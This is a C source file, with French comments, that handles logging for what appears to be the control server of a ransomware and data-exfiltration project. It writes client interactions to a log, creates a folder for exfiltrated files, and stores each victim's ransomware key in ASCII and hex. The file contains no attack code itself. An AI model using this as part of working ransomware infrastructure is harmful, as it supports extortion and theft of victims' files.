/**
 * @file logging.c
 * @brief Implémentation des fonctions de journalisation
 * @author Valentin Pizzio
 * @date 21/12/2024
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <direct.h>
#include <sys/stat.h>
#include "logging.h"
#include "protocol.h"

#define LOG_DIR "build/logs"
#define LOG_FILE "build/logs/server_log.txt"
#define RANSOMWARE_KEYS_FILE "build/logs/ransomware_keys.log"

/**
 * Assure que les répertoires nécessaires existent.
 */
void ensure_directories_exist(void) {
    // Crée le répertoire build s'il n'existe pas
    _mkdir("build");
    
    // Crée le répertoire logs dans build s'il n'existe pas
    _mkdir(LOG_DIR);
    
    // Crée le répertoire pour les fichiers exfiltrés s'il n'existe pas
    _mkdir("exfiltration_result");
}

/**
 * Enregistre une interaction avec un client dans le fichier de log.
 * 
 * @param client_id L'identifiant du client
 * @param type Le type d'interaction
 * @param message Le message associé à l'interaction
 */
void log_interaction(const char* client_id, const char* type, const char* message) {
    FILE* log_file;
    time_t now;
    struct tm* t;
    char timestamp[26];
    
    // Assure que le répertoire de logs existe
    ensure_directories_exist();
    
    // Ouvre le fichier de log en mode ajout
    log_file = fopen(LOG_FILE, "a");
    if (!log_file) {
        fprintf(stderr, "Error: Cannot open log file\n");
        return;
    }
    
    // Génère le timestamp
    time(&now);
    t = localtime(&now);
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", t);
    
    // Écrit l'entrée de log
    fprintf(log_file, "[%s] Client %s - %s: %s\n",
            timestamp, client_id, type, message);
    
    fclose(log_file);
}

/**
 * Enregistre une clé de ransomware dans le fichier des clés.
 * 
 * @param client_id L'identifiant du client
 * @param directory Le répertoire associé à la clé
 * @param key La clé de ransomware
 */
void log_ransomware_key(const char* client_id, const char* directory, const char* key) {
    FILE* key_file;
    time_t now;
    struct tm* t;
    char timestamp[26];
    char hex_key[65] = {0};  // 32 bytes = 64 hex chars + null
    
    // Assure que le répertoire de logs existe
    ensure_directories_exist();
    
    // Ouvre le fichier des clés en mode ajout
    key_file = fopen(RANSOMWARE_KEYS_FILE, "a");
    if (!key_file) {
        fprintf(stderr, "Error: Cannot open ransomware keys file\n");
        return;
    }
    
    // Génère le timestamp
    time(&now);
    t = localtime(&now);
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", t);
    
    // Convertit la clé en hexadécimal
    for (size_t i = 0; i < strlen(key); i++) {
        sprintf(hex_key + (i * 2), "%02x", (unsigned char)key[i]);
    }
    
    // Écrit l'entrée de log avec la clé en format ASCII et hexadécimal
    fprintf(key_file, "[%s] Client %s - Directory: %s\n",
            timestamp, client_id, directory);
    fprintf(key_file, "Key (ASCII): %s\n", key);
    fprintf(key_file, "Key (HEX): %s\n\n", hex_key);
    
    fclose(key_file);
}
